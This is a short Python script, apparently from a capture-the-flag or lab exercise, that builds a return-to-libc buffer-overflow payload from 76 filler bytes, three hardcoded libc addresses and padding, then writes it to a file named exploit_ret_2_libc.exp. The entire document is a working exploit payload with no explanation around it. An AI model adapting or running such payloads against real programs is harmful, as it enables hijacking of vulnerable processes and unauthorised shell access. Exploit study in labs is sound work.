payload =  b"A"*76 + b"\x50\x19\xe4\xf7" + b"\xc0\x57\xe3\xf7" + b"\x0b\x01\xf6\xf7" + b"A"*4

f = open("exploit_ret_2_libc.exp", "wb")
f.write(payload)
f.close()
